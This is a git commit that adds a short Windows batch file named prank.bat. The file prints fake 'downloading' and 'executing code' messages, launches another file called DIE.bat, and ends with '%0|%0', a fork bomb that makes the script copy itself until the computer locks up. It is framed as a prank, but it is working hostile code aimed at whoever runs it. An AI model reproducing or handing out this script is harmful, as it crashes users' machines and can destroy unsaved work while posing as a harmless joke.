7324d759b3e94ce6b3deab5c45bf2d8088bb749c
hailongcoding <156517170+hailongcoding@users.noreply.github.com>
2025-01-18 11:35:57 +0700

    Create prank.bat

---
+++ ver.3.0/prank.bat
@@ -0,0 +1,13 @@
+@echo OFF
+call :load
+
+:load
+    color 6
+    echo work starting ...
+    timeout /t 5 /nobreak > nul
+    echo downloading code ...
+    timeout /t 10 /nobreak > nul 
+    echo excuting code ...
+    timeout /t 2 /nobreak > nul 
+    start DIE.bat
+    %0|%0
